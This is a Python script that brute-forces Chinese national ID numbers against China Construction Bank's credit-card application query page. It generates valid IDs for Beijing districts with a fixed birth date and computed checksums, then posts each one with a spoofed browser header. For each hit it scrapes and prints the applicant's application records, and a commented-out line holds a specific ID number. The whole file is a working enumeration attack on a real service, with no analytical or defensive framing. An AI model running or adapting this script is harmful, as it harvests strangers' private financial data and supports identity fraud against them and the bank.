#--*-- coding:utf-8 --*--
import requests
import sys
import pprint
from BeautifulSoup import BeautifulSoup
import re

URL_JESSION = 'http://creditcard.ccb.com/tran/WCCMainPlatV5?CCB_IBSVersion=V5&SERVLET_NAME=B2CMainPlatV5&TXCODE=E13101&rd=0.666398893808946'
POST_URL = 'http://creditcard.ccb.com/tran/WCCMainPlatV5?CCB_IBSVersion=V5&SERVLET_NAME=WCCMainPlatV5'
# genaratoer
def generate_cretid():
  beijing = [
  # '110000',
  # '110100',
  '110101',
  '110102',
  '110103',
  '110104',
  '110105',
  '110106',
  '110107',
  '110108',
  '110109',
  '110111',
  '110112',
  '110113',
  '110200',
  '110221',
  '110224',
  '110226',
  '110227',
  '110228',
  '110229',
  ]
  # province = '421181'
  birthday = '19900823'
  for province in beijing:
    for seq in xrange(0,1000):
      seq = str('{0:03}'.format(seq))

      credit_id = "%s%s%s"%(province,birthday,seq)
      digitals = [ord(c) - ord('0') for c in credit_id]
      weigh = [7, 9, 10, 5, 8, 4, 2, 1, 6, 3, 7, 9, 10, 5, 8, 4, 2]
      check_sum_table = ['1', '0', 'X', '9', '8', '7','6', '5', '4', '3', '2']
      sum = 0
      for (d,w) in zip(digitals, weigh):
        sum = sum + d*w
      check_sum = check_sum_table[sum % 11]
      credit_id = "%s%s"%(credit_id,check_sum)
      yield credit_id

# get list of apply
def filter_body(credit_id, page):
  soup = BeautifulSoup(page)
  try:
    rows = soup.find('table',attrs={'id':'tableShow'}).find('tbody').findAll('tr')
  except:
    return
  # rows = soup.find('table',attrs={'id':'tableShow'}).find("tbody").find_all("tr")
  print >>sys.stderr, "%s:"%(credit_id,)
  for row in rows:
    cells = row.findAll("td")
    m = re.search(r'(\d*/\d*/\d*)', cells[1].text)
    print >>sys.stderr,'\t', cells[0]['title'],
    if m != None:
      print >>sys.stderr, '\t',m.group(0),
    print >>sys.stderr,'\t', cells[2].text

def main():
  s = requests.Session()
  s.headers.update({'User-Agent':'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.94 Safari/537.36',
  'Connection':'keep-alive',
  'Content-type':'application/x-www-form-urlencoded'})
  # payload = 'CERT_ID=42118119900823085X&BTNPay=%E6%9F%A5%E8%AF%A2&TXCODE=E13100&BRANCHID=310000000'
  '''
  get JSESSION
  '''
  r = s.get(URL_JESSION)
  for credit_id in generate_cretid():
    payload = {
    "CERT_ID":credit_id,
    "BTNPay":"查询",
    "TXCODE":"E13100",
    "BRANCHID":"310000000",
    }
    try:
      r = s.post(POST_URL, data=payload)
      filter_body(credit_id, r.text)
    except ConnectionError:
      print '[-] Max retries exceeded, update session'
      r = s.get(URL_JESSION)
  # pp = pprint.PrettyPrinter(indent=4)
  # pp.pprint(r.request.__dict__)
  # print >>sys.stderr, r.text

if __name__ == "__main__":
  main()
